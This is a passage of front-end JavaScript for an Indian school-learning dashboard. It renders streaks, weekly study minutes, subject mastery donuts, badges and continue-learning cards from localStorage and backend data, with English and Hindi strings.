/* Lifted verbatim from edulearn-frontend/dashboard.html — do not hand-edit.
   Regenerate with `npm run sync:js`.

   Runs inside the page-script environment: the destructured parameters
   shadow the real globals so ".html" navigations become route changes and
   listeners can be torn down on unmount. See src/lib/pageScriptEnv.ts. */
/* eslint-disable */
export default function init({ location, document, window, onCleanup }) {
try{if(!document.documentElement.classList.contains('kid-dark')){document.documentElement.classList.remove('dark-mode');}localStorage.setItem('edulearn-theme','light');}catch(e){}

/* ---- next <script> block ---- */


/* ============================================================
   BESTBRAIN DASHBOARD — application script
   ============================================================ */
(function(){
'use strict';

var $  = function(s, c){ return (c||document).querySelector(s); };
var $$ = function(s, c){ return Array.prototype.slice.call((c||document).querySelectorAll(s)); };
var RM = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
var EASE_MS = RM ? 0 : 1;

/* ------------------------------------------------------------
   SHARED STATE — localStorage "edutok_state"
------------------------------------------------------------ */
// Empty defaults: a new user sees zeros / empty states, never invented data.
// Real values are injected from the backend in applyDashboardData().
var DEFAULTS = {
  lang: 'en',
  streak: 0,
  minutes: [0,0,0,0,0,0,0],
  badges: [],
  chapters: {},
  pal: { level:1, remedialMastery:0, finalUnlocked:false, hints:3, skips:1 }
};

// Real per-subject mastery + badges from the backend (data.mastery). Empty
// until the API responds; drives the donuts + badge shelf. No fabricated data.
var MASTERY = { subjects: [], badges: [], hasActivity: false };

function deepMerge(base, over){
  var out = {};
  var k;
  for (k in base){ if (Object.prototype.hasOwnProperty.call(base, k)) out[k] = base[k]; }
  if (!over || typeof over !== 'object') return out;
  for (k in over){
    if (!Object.prototype.hasOwnProperty.call(over, k)) continue;
    var bv = base[k], ov = over[k];
    if (bv && ov && typeof bv === 'object' && typeof ov === 'object' && !Array.isArray(bv) && !Array.isArray(ov)){
      out[k] = deepMerge(bv, ov);
    } else if (ov !== undefined && ov !== null){
      out[k] = ov;
    }
  }
  return out;
}

function loadState(){
  var st;
  try {
    var raw = localStorage.getItem('edutok_state');
    if (!raw){
      st = JSON.parse(JSON.stringify(DEFAULTS));
      localStorage.setItem('edutok_state', JSON.stringify(st));
      return st;
    }
    st = deepMerge(DEFAULTS, JSON.parse(raw));
  } catch (e) {
    st = JSON.parse(JSON.stringify(DEFAULTS));
  }
  if (!Array.isArray(st.minutes) || st.minutes.length !== 7) st.minutes = DEFAULTS.minutes.slice();
  if (!Array.isArray(st.badges)) st.badges = DEFAULTS.badges.slice();
  return st;
}
function saveState(){
  try { localStorage.setItem('edutok_state', JSON.stringify(STATE)); } catch (e) { /* storage unavailable */ }
}
var STATE = loadState();
// Hindi is disabled in production (see the commented-out toggle above) —
// force English regardless of a stale localStorage value from before.
STATE.lang = 'en';

/* ------------------------------------------------------------
   i18n — EN / HI dictionary
------------------------------------------------------------ */
var I18N = {
  en: {
    'nav.home':'Home', 'nav.learn':'Learn', 'nav.pal':'PAL Adaptive AI', 'nav.dashboard':'Dashboard',
    'nav.start':'Start free',
    'role.student':'Student', 'role.teacher':'Teacher', 'role.parent':'Parent',
    'role.note':'One platform · three views',
    'strip.streak':'day streak',
    's.minutes':'Weekly minutes', 's.minutesSub':'Last 7 days', 's.minWeek':'min this week',
    's.mastery':'Subject mastery', 's.badges':'Badge shelf',
    's.reco':'AI recommends', 's.recoSub':'Tokky found 3 gaps worth fixing before your next test.',
    's.fix':'Fix this gap', 's.continue':'Continue learning', 's.all':'All chapters →',
    't.avg':'Class average', 't.weak':'Weak topics this week', 't.students':'Students',
    't.sortHint':'Click mastery to sort',
    'p.streak':'day streak', 'p.week':'this week', 'p.total':'all-time',
    'p.screen':'Learning time this week', 'p.alerts':'Alerts',
    'p.reassureH':'Built to never block learning',
    'p.reassureP':'All learning works offline — videos, practice and tests run without internet, and usage syncs automatically when you are back online.',
    'rail.rhythm':'Learning rhythm', 'rail.langs':'11 languages',
    'rail.langsSub':'The whole dashboard, in your language.',
    'foot.tag':'Made for Bharat. Works fully offline.'
  },
  hi: {
    'nav.home':'होम', 'nav.learn':'सीखें', 'nav.pal':'PAL अनुकूली AI', 'nav.dashboard':'डैशबोर्ड',
    'nav.start':'मुफ़्त शुरू करें',
    'role.student':'विद्यार्थी', 'role.teacher':'शिक्षक', 'role.parent':'अभिभावक',
    'role.note':'एक मंच · तीन नज़रिए',
    'strip.streak':'दिन की स्ट्रीक',
    's.minutes':'साप्ताहिक मिनट', 's.minutesSub':'पिछले 7 दिन', 's.minWeek':'मिनट इस हफ़्ते',
    's.mastery':'विषय महारत', 's.badges':'बैज शेल्फ़',
    's.reco':'AI की सलाह', 's.recoSub':'टोकी ने अगले टेस्ट से पहले सुधारने लायक 3 कमियाँ ढूँढी हैं।',
    's.fix':'यह कमी दूर करें', 's.continue':'सीखना जारी रखें', 's.all':'सभी अध्याय →',
    't.avg':'कक्षा का औसत', 't.weak':'इस हफ़्ते के कमज़ोर विषय', 't.students':'विद्यार्थी',
    't.sortHint':'क्रम बदलने के लिए महारत पर क्लिक करें',
    'p.streak':'दिन की स्ट्रीक', 'p.week':'इस हफ़्ते', 'p.total':'कुल',
    'p.screen':'इस हफ़्ते सीखने का समय', 'p.alerts':'सूचनाएँ',
    'p.reassureH':'सीखना कभी न रुके, ऐसा बनाया गया',
    'p.reassureP':'पूरी पढ़ाई ऑफ़लाइन चलती है — वीडियो, अभ्यास और टेस्ट बिना इंटरनेट के चलते हैं, और ऑनलाइन आते ही उपयोग अपने आप सिंक हो जाता है।',
    'rail.rhythm':'सीखने की लय', 'rail.langs':'11 भाषाएँ',
    'rail.langsSub':'पूरा डैशबोर्ड, आपकी भाषा में।',
    'foot.tag':'भारत के लिए बना। पूरी तरह ऑफ़लाइन।'
  }
};

var GREET = {
  en: { morning:'Good <em>morning</em>', afternoon:'Good <em>afternoon</em>', evening:'Good <em>evening</em>',
        names: { student:'Ananya', teacher:'Mrs. Iyer', parent:'Mr. Sharma' } },
  hi: { morning:'सु<em>प्रभात</em>', afternoon:'शुभ <em>दोपहर</em>', evening:'शुभ <em>संध्या</em>',
        names: { student:'अनन्या', teacher:'श्रीमती अय्यर', parent:'शर्मा जी' } }
};

var currentRole = 'student';

function applyLang(lang){
  if (lang !== 'en' && lang !== 'hi') lang = 'en';
  STATE.lang = lang;
  saveState();
  var dict = I18N[lang];
  $$('[data-i18n]').forEach(function(el){
    var key = el.getAttribute('data-i18n');
    if (dict[key] !== undefined) el.textContent = dict[key];
  });
  document.documentElement.lang = lang;
  // Toggle + rail card are commented out (Hindi disabled) — guard absence.
  var en = $('#langEn'), hi = $('#langHi');
  if (en) { en.classList.toggle('on', lang === 'en'); en.setAttribute('aria-pressed', String(lang === 'en')); }
  if (hi) { hi.classList.toggle('on', lang === 'hi'); hi.setAttribute('aria-pressed', String(lang === 'hi')); }
  $$('#railLangs .lang-chip.live').forEach(function(ch){
    ch.classList.toggle('on', ch.getAttribute('data-lang') === lang);
  });
  renderGreeting();
}

function renderGreeting(){
  var h = new Date().getHours();
  var slot = h < 12 ? 'morning' : (h < 17 ? 'afternoon' : 'evening');
  var g = GREET[STATE.lang] || GREET.en;
  // Prefer the REAL logged-in user's first name; fall back to demo name.
  var who = g.names[currentRole];
  try {
    var u = window.EduAPI && EduAPI.getUser();
    if (u && u.name) who = u.name.split(' ')[0];
  } catch (e) {}
  $('#greetLine').innerHTML = g[slot] + ', ' + who + '.';
}

/* ------------------------------------------------------------
   date helpers
------------------------------------------------------------ */
var DAY_FULL  = ['SUNDAY','MONDAY','TUESDAY','WEDNESDAY','THURSDAY','FRIDAY','SATURDAY'];
var DAY_SHORT = ['SU','MO','TU','WE','TH','FR','SA'];
var DAY_TIP   = ['SUN','MON','TUE','WED','THU','FRI','SAT'];
var MON_SHORT = ['JAN','FEB','MAR','APR','MAY','JUN','JUL','AUG','SEP','OCT','NOV','DEC'];
var MON_TITLE = ['January','February','March','April','May','June','July','August','September','October','November','December'];

function dayOffset(n){
  var d = new Date();
  d.setDate(d.getDate() - n);
  return d;
}

function initDates(){
  var now = new Date();
  $('#greetDate').textContent = DAY_FULL[now.getDay()] + ' · ' + now.getDate() + ' ' + MON_SHORT[now.getMonth()];
  var start = dayOffset(6);
  $('#weekRange').textContent = 'WEEK OF ' + start.getDate() + ' ' + MON_SHORT[start.getMonth()] + ' – ' + now.getDate() + ' ' + MON_SHORT[now.getMonth()];
}

/* ------------------------------------------------------------
   top strip — streak + pal chip
------------------------------------------------------------ */
// Null-guarded throughout. The PAL level chip was removed from the markup and
// this function used to dereference #palChipTxt / #palDots unconditionally,
// which would have thrown here and aborted every later call in init().
function setTextIf(sel, value){
  var el = document.querySelector(sel);
  if (el) el.textContent = value;
}

function initStrip(){
  setTextIf('#streakNum', STATE.streak);
  setTextIf('#pStreak', STATE.streak);

  var total = (STATE.minutes || []).reduce(function(a, b){ return a + (b || 0); }, 0);
  setTextIf('#weekTotal', total);
  setTextIf('#pHours', (total / 60).toFixed(1) + 'h');

  // Replaces the old hardcoded "synced 2h ago" chip with something true: did
  // this student study today? Driven by insights.activeToday, defaulting to
  // "not yet" rather than claiming activity we cannot see.
  var chip = document.getElementById('todayChip');
  if (chip){
    var did = !!STATE.activeToday;
    chip.innerHTML =
      '<i class="today-dot" style="background:' + (did ? '#0E9E6E' : '#C99A2E') + '"></i>' +
      '<span>' + (did ? 'You have studied today' : 'You have not studied yet today') + '</span>';
  }

  // The week range caption was the static string "WEEK OF 4–10 JUNE".
  var wr = document.getElementById('weekRange');
  if (wr){
    var end = dayOffset(0), start = dayOffset(6);
    wr.textContent = 'WEEK OF ' + start.getDate() + ' ' + MON_SHORT[start.getMonth()] +
      ' – ' + end.getDate() + ' ' + MON_SHORT[end.getMonth()];
  }
}

/* ------------------------------------------------------------
   STUDENT — weekly minutes bar chart (SVG)
------------------------------------------------------------ */
function buildBars(){
  var svg = $('#barchart');
  var mins = STATE.minutes;
  var max = Math.max.apply(null, mins.concat([1]));
  var baseY = 150, plotH = 118, slot = 49, x0 = 18, bw = 30;
  var html = '';
  for (var i = 0; i < 7; i++){
    var h = Math.max(5, Math.round(mins[i] / max * plotH));
    var x = x0 + slot * i + (slot - bw) / 2;
    var y = baseY - h;
    var d = dayOffset(6 - i);
    var isToday = (i === 6);
    // Every non-today bar used to be the same flat rgba(124,155,255,.34), which
    // left the chart colourless once it had real data in it. Each day now takes
    // its own hue from the palette via a class, so it follows light/dark mode
    // instead of being pinned to one hardcoded rgba.
    html += '<g class="barg" data-i="' + i + '" data-v="' + mins[i] + '" data-d="' + DAY_TIP[d.getDay()] + '">';
    html += '<rect class="bar-track" x="' + x + '" y="' + (baseY - plotH) + '" width="' + bw + '" height="' + plotH + '" rx="8"/>';
    html += '<rect class="bar bar-h' + (isToday ? 'today' : (i % 6)) + '" x="' + x + '" y="' + y + '" width="' + bw + '" height="' + h + '" rx="8"/>';
    html += '<text x="' + (x + bw / 2) + '" y="170" text-anchor="middle"' + (isToday ? ' class="today-lab"' : '') + '>' + DAY_SHORT[d.getDay()] + '</text>';
    html += '</g>';
  }
  svg.innerHTML = html;

  var tip = $('#barTip');
  var wrap = svg.parentElement;
  $$('.barg', svg).forEach(function(g){
    g.addEventListener('mouseenter', function(){
      var bar = g.querySelector('.bar');
      var br = bar.getBoundingClientRect();
      var wr = wrap.getBoundingClientRect();
      tip.innerHTML = '<b>' + g.getAttribute('data-v') + '</b> MIN · ' + g.getAttribute('data-d');
      tip.style.left = (br.left - wr.left + br.width / 2) + 'px';
      tip.style.top = (br.top - wr.top) + 'px';
      tip.classList.add('show');
    });
    g.addEventListener('mouseleave', function(){ tip.classList.remove('show'); });
  });
}
function animateBars(){
  $$('#barchart .bar').forEach(function(b, i){
    b.classList.remove('up');
    void b.getBoundingClientRect();
    setTimeout(function(){ b.classList.add('up'); }, RM ? 0 : 120 + i * 80);
  });
}

/* ------------------------------------------------------------
   STUDENT — subject mastery donuts
------------------------------------------------------------ */
// Stable colour per canonical subject key (from the backend mastery payload).
var SUBJECT_COLORS = {
  maths:'#7C9BFF', science:'#3DE8C5', sst:'#FFB454', english:'#FF7AA2', hindi:'#C2A8FF'
};
var DONUT_R = 31, DONUT_C = 2 * Math.PI * 31;

// Built from real backend mastery. Empty until data arrives → honest empty state.
var SUBJECTS = [];

function buildDonuts(){
  var grid = $('#donutGrid');
  if (!grid) return;

  // Honest empty state: no real mastery yet.
  if (!SUBJECTS.length){
    grid.innerHTML = '<p class="empty-hint" style="grid-column:1/-1">' +
      'No subject mastery yet. Complete chapters and mock tests and your mastery will appear here.</p>';
    return;
  }

  var html = '';
  SUBJECTS.forEach(function(s, i){
    html += '<div class="donut-cell">';
    html += '<svg class="donut" viewBox="0 0 78 78" role="img" aria-label="' + s.name + ' mastery ' + s.pct + ' percent">';
    html += '<circle class="trk" cx="39" cy="39" r="' + DONUT_R + '"/>';
    html += '<circle class="val" data-pct="' + s.pct + '" cx="39" cy="39" r="' + DONUT_R + '" stroke="' + s.color + '" stroke-dasharray="' + DONUT_C.toFixed(1) + '" stroke-dashoffset="' + DONUT_C.toFixed(1) + '"/>';
    html += '<text x="39" y="40" data-cnt="' + s.pct + '">0</text>';
    html += '</svg>';
    html += '<span class="dlab">' + s.name + '</span>';
    html += '</div>';
  });
  grid.innerHTML = html;
}
function animateDonuts(){
  $$('#donutGrid .val').forEach(function(c, i){
    var pct = parseInt(c.getAttribute('data-pct'), 10);
    c.style.strokeDashoffset = DONUT_C;
    void c.getBoundingClientRect();
    setTimeout(function(){
      c.style.strokeDashoffset = (DONUT_C * (1 - pct / 100)).toFixed(1);
    }, RM ? 0 : 200 + i * 110);
  });
  $$('#donutGrid text').forEach(function(t, i){
    countUp(t, parseInt(t.getAttribute('data-cnt'), 10), 1300, '');
  });
}

/* ------------------------------------------------------------
   STUDENT — badge shelf (medallion SVGs)
------------------------------------------------------------ */
var ICONS = {
  leaf: '<path d="M7 25 C7 13 16 7 26 7 C26 17 20 25 8 25 Z" /><path d="M8 25 C12 19 17 14 23 10"/>',
  pie:  '<circle cx="16" cy="16" r="10"/><path d="M16 6 v20"/><path d="M16 16 h10"/>',
  bolt: '<path d="M17 4 L8 18 h6 l-1 10 9-14 h-6 l1-10 z"/>',
  rays: '<circle cx="16" cy="16" r="5"/><path d="M16 4v3"/><path d="M16 25v3"/><path d="M4 16h3"/><path d="M25 16h3"/><path d="M7.5 7.5l2.1 2.1"/><path d="M22.4 22.4l2.1 2.1"/><path d="M24.5 7.5l-2.1 2.1"/><path d="M9.6 22.4l-2.1 2.1"/>',
  eq:   '<path d="M7 12 h18"/><path d="M7 20 h18"/><circle cx="16" cy="6.5" r="1.4"/><circle cx="16" cy="25.5" r="1.4"/>',
  clock:'<circle cx="16" cy="16" r="10"/><path d="M16 10 v6 l4 2.5"/>',
  lock: '<rect x="9" y="14" width="14" height="11" rx="3"/><path d="M12 14 v-3 a4 4 0 0 1 8 0 v3"/>'
};
var BADGE_CATALOG = [
  { id:'photosynthesis', label:'Photosynthesis',  sub:'Science · CH 1',  icon:'leaf'  },
  { id:'fractions',      label:'Fractions',       sub:'Maths · CH 2',    icon:'pie'   },
  { id:'electricity',    label:'Electric Current',sub:'Science · CH 14', icon:'bolt'  },
  { id:'light',          label:'Light',           sub:'Science · CH 15', icon:'rays'  },
  { id:'equations',      label:'Simple Equations',sub:'Maths · CH 4',    icon:'eq'    },
  { id:'motion',         label:'Motion & Time',   sub:'Science · CH 13', icon:'clock' }
];

function medalSVG(b, earned){
  var gid = 'mg-' + b.id;
  var s = '<svg viewBox="0 0 96 96" role="img" aria-label="' + b.label + ' badge' + (earned ? '' : ' locked') + '">';
  s += '<defs><linearGradient id="' + gid + '" x1="0%" y1="0%" x2="100%" y2="100%">';
  s += '<stop offset="0%" stop-color="#3DE8C5"/><stop offset="48%" stop-color="#7C9BFF"/><stop offset="100%" stop-color="#FFB454"/>';
  s += '</linearGradient></defs>';
  s += '<circle cx="48" cy="48" r="45" fill="#121C30" stroke="url(#' + gid + ')" stroke-width="2.5"/>';
  s += '<circle cx="48" cy="48" r="38" fill="none" stroke="var(--hair-2)" stroke-width="1" stroke-dasharray="2.5 4.5"/>';
  s += '<circle cx="48" cy="48" r="32" fill="var(--hair)"/>';
  // engraved notches around the rim
  for (var a = 0; a < 12; a++){
    var ang = a * Math.PI / 6;
    var x1 = 48 + Math.cos(ang) * 41.5, y1 = 48 + Math.sin(ang) * 41.5;
    var x2 = 48 + Math.cos(ang) * 44.0, y2 = 48 + Math.sin(ang) * 44.0;
    s += '<line x1="' + x1.toFixed(1) + '" y1="' + y1.toFixed(1) + '" x2="' + x2.toFixed(1) + '" y2="' + y2.toFixed(1) + '" stroke="var(--hair-2)" stroke-width="1.2" stroke-linecap="round"/>';
  }
  var icon = earned ? ICONS[b.icon] : ICONS.lock;
  s += '<g transform="translate(32,32)" fill="none" stroke="' + (earned ? '#F2EDE3' : '#949DB0') + '" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">' + icon + '</g>';
  s += '</svg>';
  return s;
}

// Pick a medallion icon for a real backend badge by matching keywords in its
// key/label; falls back to a generic ray icon.
function iconForBadge(b){
  var t = ((b.key || '') + ' ' + (b.label || '')).toLowerCase();
  if (t.indexOf('streak') !== -1) return 'clock';
  if (t.indexOf('mock') !== -1 || t.indexOf('ace') !== -1) return 'bolt';
  if (t.indexOf('chapter') !== -1) return 'eq';
  return 'rays';
}

function buildBadges(){
  var shelf = $('#badgeShelf');
  if (!shelf) return;
  var earned = (MASTERY.badges || []);

  // Honest empty state: nothing genuinely earned yet.
  if (!earned.length){
    shelf.innerHTML = '<p class="empty-hint" style="width:100%">' +
      'No badges yet. Master a chapter, keep a daily streak, or ace a mock test to earn your first.</p>';
    var bc0 = $('#badgeCount'); if (bc0) bc0.textContent = '0 EARNED';
    return;
  }

  var html = '';
  earned.forEach(function(b){
    var meta = { id: b.key, label: b.label, icon: iconForBadge(b) };
    html += '<div class="medal-cell">';
    html += '<div class="medal">' + medalSVG(meta, true) + '</div>';
    html += '<span class="mlab">' + escapeHtml(b.label) + '</span>';
    html += '<span class="msub">' + escapeHtml(b.earnedFrom || 'Earned') + '</span>';
    html += '</div>';
  });
  shelf.innerHTML = html;
  var bc = $('#badgeCount'); if (bc) bc.textContent = earned.length + ' EARNED';
}

/* ------------------------------------------------------------
   STUDENT — continue learning cards
------------------------------------------------------------ */
// CHAPTER_META is now derived from the SHARED curriculum (../curriculum.js,
// extracted from learn.html) instead of a hardcoded 5-entry demo stub.
//
// The old stub was why "Continue learning" could never show anything: its id
// scheme was correct ('c7-sci-adolescence') but it only contained 5 of the 190
// chapters, so any real chapter the student opened was dropped by the
// `if (!meta) continue` lookup. Now all 190 resolve, and learn.html and the
// dashboard agree on chapter names, ids and links by construction.
var CHAPTER_META = (function () {
  var out = {};
  var C = window.EduCurriculum;
  if (!C) return out;                 // curriculum.js failed to load — degrade to empty
  Object.keys(C.CHAPTER_INDEX).forEach(function (id) {
    var m = C.CHAPTER_INDEX[id];
    out[id] = {
      title: m.name,
      sub: m.subject.en + ' · Chapter ' + (m.idx + 1),
      cls: m.cls,
      subject: m.subject.key,
      accent: m.subject.accent,
      mins: m.mins
    };
  });
  return out;
})();

/* ------------------------------------------------------------
   CLASS-6 FRIENDLY SECTIONS
   Three rules everywhere below:
     1. Never show a bare number — say what it MEANS.
     2. Always offer the next step.
     3. Empty states must still be useful, not apologetic.
------------------------------------------------------------ */

// The signed-in user, set by bootAuth() once requireAuth() resolves. The
// kid-facing sections need className to pick the right class's syllabus, and
// they can render before auth resolves, so this must exist up front.
var CURRENT_USER = null;

var ICON = {
  play:  '<path d="M6 4l12 8-12 8z"/>',
  clock: '<circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/>',
  fire:  '<path d="M12 2.6c.9 3-1.4 4.8-2.8 6.8C7.9 11.2 7 13 7 15a5.5 5.5 0 0 0 11 0c0-2.7-1.4-4.7-2.9-6.5-.4 1.1-1 1.9-2 2.5.4-2.7-.6-6-3.1-8.4z"/>',
  book:  '<path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>',
  star:  '<path d="M12 2.5l2.9 6 6.6.9-4.8 4.6 1.2 6.5L12 17.4 6.1 20.5l1.2-6.5L2.5 9.4l6.6-.9z"/>',
  spark: '<path d="M12 3l1.9 5.6L19.5 10l-5.6 1.9L12 17.5l-1.9-5.6L4.5 10l5.6-1.4z"/>'
};
function ico(name, size, stroke){
  return '<svg width="' + (size||22) + '" height="' + (size||22) + '" viewBox="0 0 24 24" fill="none" ' +
    'stroke="' + (stroke||'currentColor') + '" stroke-width="1.8" stroke-linecap="round" ' +
    'stroke-linejoin="round" aria-hidden="true">' + (ICON[name]||'') + '</svg>';
}

// How far through a chapter the student is (0-100).
function chapterPct(ch){
  if (!ch) return 0;
  return Math.round(((ch.video || 0) + (ch.practice || 0)) / 2);
}

// ---- NEXT UP -------------------------------------------------
// Picks the chapter closest to being finished (but not finished), so the
// student always gets a quick win. Falls back to chapter 1 of their class.
function buildNextUp(){
  var host = $('#nextUpCard');
  if (!host) return;
  var best = null;
  Object.keys(STATE.chapters || {}).forEach(function(id){
    var meta = CHAPTER_META[id];
    if (!meta) return;
    var ch = STATE.chapters[id];
    if (ch && ch.mastered) return;
    var pct = chapterPct(ch);
    if (pct <= 0) return;
    if (!best || pct > best.pct) best = { id:id, meta:meta, pct:pct };
  });

  var cls = (CURRENT_USER && parseInt(String(CURRENT_USER.className || '').replace(/\D/g,''), 10)) || 7;

  if (!best){
    // Brand-new student: suggest a real first chapter rather than an apology.
    var C = window.EduCurriculum;
    var firstId = null, firstMeta = null;
    if (C){
      var subj = C.SUBJECTS.find(function(s){ return (C.CURRICULUM[cls]||{})[s.key]; });
      var firstCh = subj && C.CURRICULUM[cls][subj.key][0];
      if (firstCh){
        firstId = 'c' + cls + '-' + subj.code + '-' + firstCh[0];
        firstMeta = CHAPTER_META[firstId];
      }
    }
    host.innerHTML =
      '<div class="nextup__row">' +
        '<div class="nextup__ic" style="background:' + (firstMeta ? firstMeta.accent : '#3F5BE0') + '">' + ico('spark',26,'#fff') + '</div>' +
        '<div class="nextup__body">' +
          '<span class="nextup__kicker">Start here</span>' +
          '<h3 class="nextup__title">' + (firstMeta ? escapeHtml(firstMeta.title) : 'Pick your first chapter') + '</h3>' +
          '<p class="nextup__sub">' + (firstMeta
            ? escapeHtml(firstMeta.sub) + ' &middot; about ' + firstMeta.mins + ' minutes'
            : 'Open Learn and choose any chapter — you can always change your mind.') + '</p>' +
        '</div>' +
        '<a class="btn-primary nextup__cta" href="' + (firstId && firstMeta ? chapterHref(firstId, firstMeta) : 'learn.html') + '">' +
          ico('play',18) + '<span>Start learning</span></a>' +
      '</div>';
    return;
  }

  var left = 100 - best.pct;
  host.innerHTML =
    '<div class="nextup__row">' +
      '<div class="nextup__ic" style="background:' + best.meta.accent + '">' + ico('play',26,'#fff') + '</div>' +
      '<div class="nextup__body">' +
        '<span class="nextup__kicker">Pick up where you left off</span>' +
        '<h3 class="nextup__title">' + escapeHtml(best.meta.title) + '</h3>' +
        '<p class="nextup__sub">' + escapeHtml(best.meta.sub) + ' &middot; you are <b>' + best.pct +
          '% done</b> — only ' + left + '% left to finish it!</p>' +
        '<div class="nextup__bar"><i style="width:' + best.pct + '%;background:' + best.meta.accent + '"></i></div>' +
      '</div>' +
      '<a class="btn-primary nextup__cta" href="' + chapterHref(best.id, best.meta) + '">' +
        ico('play',18) + '<span>Continue</span></a>' +
    '</div>';
}

// ---- YOUR WEEK ----------------------------------------------
// Four tiles. Each pairs a number with what it actually means.
function buildWeekGrid(){
  var host = $('#weekGrid');
  if (!host) return;
  var mins = (STATE.minutes || []).reduce(function(a,b){ return a + (b||0); }, 0);
  var activeDays = (STATE.minutes || []).filter(function(m){ return m > 0; }).length;
  var streak = STATE.streak || 0;
  var badges = (MASTERY.badges || []).length;
  // ~55 min is a typical chapter in this curriculum, so this is an honest
  // comparison rather than a made-up one.
  var chapterEquiv = mins > 0 ? Math.max(1, Math.round(mins / 55)) : 0;

  var tiles = [
    { c:'--c2', icon:'clock', big: mins, unit:'minutes',
      cap: mins > 0 ? 'That is about ' + chapterEquiv + ' chapter' + (chapterEquiv === 1 ? '' : 's') + ' of learning this week.'
                    : 'No learning time yet this week — even 10 minutes counts.' },
    { c:'--c3', icon:'fire', big: streak, unit:'day streak',
      cap: streak > 0 ? 'Learn something tomorrow to make it ' + (streak + 1) + '!'
                      : 'Learn on any day to start a streak.' },
    { c:'--c1', icon:'book', big: activeDays, unit:'of 7 days',
      cap: activeDays >= 5 ? 'Brilliant — you showed up almost every day.'
         : activeDays > 0  ? 'Try for one more day next week.'
                           : 'Pick any one day to begin.' },
    { c:'--c5', icon:'star', big: badges, unit:'badges',
      cap: badges > 0 ? 'Keep finishing chapters to collect more.'
                      : 'Finish your first chapter to earn one.' }
  ];

  host.innerHTML = tiles.map(function(t){
    return '<div class="wtile" style="--ac:var(' + t.c + ')">' +
      '<span class="wtile__ic">' + ico(t.icon,20) + '</span>' +
      '<b class="wtile__big">' + t.big + '</b>' +
      '<span class="wtile__unit">' + t.unit + '</span>' +
      '<p class="wtile__cap">' + t.cap + '</p>' +
    '</div>';
  }).join('');
}

// ---- MY SUBJECTS --------------------------------------------
// The syllabus as a map: one coloured card per subject with real chapter
// counts from the shared curriculum and real progress from the API.
function buildSubjectMap(){
  var host = $('#subjMap');
  var C = window.EduCurriculum;
  if (!host || !C) return;
  var cls = (CURRENT_USER && parseInt(String(CURRENT_USER.className || '').replace(/\D/g,''), 10)) || 7;

  host.innerHTML = C.SUBJECTS.map(function(s){
    var chapters = (C.CURRICULUM[cls] || {})[s.key] || [];
    if (!chapters.length) return '';
    var done = 0;
    chapters.forEach(function(ch){
      var st = (STATE.chapters || {})['c' + cls + '-' + s.code + '-' + ch[0]];
      if (st && (st.mastered || chapterPct(st) >= 100)) done++;
    });
    var pct = chapters.length ? Math.round(done / chapters.length * 100) : 0;
    return '<a class="subjcard" href="learn.html?class=' + cls + '&subject=' + s.key + '" style="--ac:' + s.accent + '">' +
      '<span class="subjcard__dot" style="background:' + s.accent + '"></span>' +
      '<h4 class="subjcard__name">' + escapeHtml(s.en) + '</h4>' +
      '<p class="subjcard__meta">' + done + ' of ' + chapters.length + ' chapters done</p>' +
      '<div class="subjcard__bar"><i style="width:' + pct + '%;background:' + s.accent + '"></i></div>' +
      '<span class="subjcard__go">' + (done === 0 ? 'Start' : done === chapters.length ? 'All done!' : 'Keep going') + ' &rarr;</span>' +
    '</a>';
  }).join('');
}

// Build the same lesson.html?class=&subject=&ch= URL that learn.html's
// lessonHref() produces, so links from here land on the real chapter's
// video instead of falling back to lesson.html's generic placeholder.
function chapterHref(id, meta){
  return 'lesson.html?class=' + meta.cls + '&subject=' + meta.subject + '&ch=' + encodeURIComponent(id);
}

function buildContinue(){
  var grid = $('#contGrid');
  var rows = [];
  var id;
  for (id in STATE.chapters){
    if (!Object.prototype.hasOwnProperty.call(STATE.chapters, id)) continue;
    var ch = STATE.chapters[id];
    var meta = CHAPTER_META[id];
    if (!meta || ch.mastered) continue;
    var prog = Math.round(((ch.video || 0) + (ch.practice || 0)) / 2);
    if (prog <= 0) continue;
    rows.push({ id:id, meta:meta, prog:prog, ch:ch });
  }
  rows.sort(function(a, b){ return b.prog - a.prog; });
  rows = rows.slice(0, 3);
  var html = '';
  rows.forEach(function(r){
    html += '<a class="cont-card" href="' + chapterHref(r.id, r.meta) + '">';
    html += '<div class="cc-row"><span class="cls-chip c' + r.meta.cls + '">Class ' + r.meta.cls + '</span>';
    html += '<svg width="26" height="26" viewBox="0 0 26 26" fill="none"><circle cx="13" cy="13" r="12" stroke="var(--hair-2)" stroke-width="1"/><path d="M10.5 8.5 L17.5 13 L10.5 17.5 Z" stroke="#F2EDE3" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></div>';
    html += '<h4>' + r.meta.title + '</h4>';
    html += '<div class="ccsub">' + r.meta.sub + (r.ch.test !== null && r.ch.test !== undefined ? ' · Test ' + r.ch.test + '%' : '') + '</div>';
    html += '<div class="prog"><i data-w="' + r.prog + '"></i></div>';
    html += '<div class="pct-row"><span>VIDEO ' + (r.ch.video || 0) + '% · PRACTICE ' + (r.ch.practice || 0) + '%</span><b>' + r.prog + '%</b></div>';
    html += '</a>';
  });
  // Every other section on this page has an empty state; this one rendered a
  // bare heading over blank space instead.
  //
  // KNOWN GAP: this card is currently always empty in production. It is driven
  // by STATE.chapters (localStorage 'edutok_state'), which nothing ever writes
  // — api.js only deletes the key on login/logout, and applyDashboardData()
  // never populates it. Wiring /api/dashboard's progress.chapters through is
  // not sufficient on its own: the backend keys chapters as e.g.
  // "science-motion" with {completed, exercises, correct}, while this renderer
  // needs an id present in the hardcoded 5-entry CHAPTER_META above (e.g.
  // "c7-sci-adolescence") and a {video, practice} shape. The id spaces do not
  // intersect, so the rows would still be dropped by the `if (!meta) continue`
  // above. Making this real needs chapter metadata sourced from the backend
  // (learn.html already renders the real 49-chapter list) rather than a
  // hardcoded demo map — a product decision, not a mechanical fix.
  if (!rows.length){
    html = '<p class="empty-hint" style="color:var(--muted);font-size:13.5px;padding:6px 2px;">' +
      'Nothing in progress yet — open a chapter from Learn and it will show up here.</p>';
  }
  grid.innerHTML = html;
}
function animateContinue(){
  $$('#contGrid .prog i').forEach(function(bar, i){
    bar.style.width = '0%';
    void bar.getBoundingClientRect();
    setTimeout(function(){ bar.style.width = bar.getAttribute('data-w') + '%'; }, RM ? 0 : 300 + i * 120);
  });
}

/* ------------------------------------------------------------
   TEACHER — class average + weak topic bars
